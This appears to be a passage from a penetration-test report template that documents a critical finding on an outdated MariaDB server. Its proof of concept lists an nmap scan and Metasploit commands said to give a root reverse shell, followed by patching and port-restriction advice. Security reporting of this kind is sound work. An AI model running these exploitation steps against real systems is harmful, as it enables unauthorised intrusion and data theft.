## **2. Scope and Methodology**

### **2.1 Scope**

The scope of this assessment was defined as the IP range **[IP Range, e.g., 192.168.1.0/24]**. The test focused on identifying vulnerabilities in network services, configurations, and protocols.

### **2.2 Methodology**

The assessment was performed using a **gray-box methodology**, where we were provided with basic network information but no credentials. The following phases were conducted:
* **Reconnaissance:** Identification of live hosts and open ports.
* **Vulnerability Scanning:** Use of automated tools to find known vulnerabilities.
* **Manual Exploitation:** Attempted to exploit identified vulnerabilities to prove their existence and potential impact.

## **3. Findings & Vulnerabilities**

This section contains the technical details of the vulnerabilities discovered during the test.

### **Finding 1: Outdated MariaDB Service with Remote Code Execution**

* **Severity:** **Critical**
* **Vulnerability:** The MariaDB service running on the server is an outdated version (10.0.12) that is known to be vulnerable to a remote code execution exploit ([CVE-2022-24376]).
* **Impact:** An attacker could execute arbitrary commands on the database server, leading to a complete system compromise and potential data exfiltration.
* **Affected System:** **Database Server (192.168.1.50)**

### **Proof of Concept (PoC)**

The following steps were used to demonstrate the vulnerability and its exploitability:

1.  **Service Enumeration:** Used **Nmap** to scan the target and identify the running service version.
    * `nmap -sV 192.168.1.50 -p 3306`
2.  **Exploitation:** Used the **Metasploit Framework** to gain a reverse shell.
    * `use exploit/linux/mysql/mariadb_priv_esc`
    * `set RHOSTS 192.168.1.50`
    * `run`
3.  **Confirmation of Compromise:** Upon successful exploitation, executed the `whoami` command to confirm root-level access.
    * `whoami`
    * `root`

### **Remediation Recommendations**

* **Immediate Fix:** Apply the latest security patches to the MariaDB service immediately.
* **Long-Term Fix:** Implement a formal patch management policy to ensure all services are regularly updated.
* **Network Security:** Restrict access to the database service port (**3306**) to only essential, authorized systems.
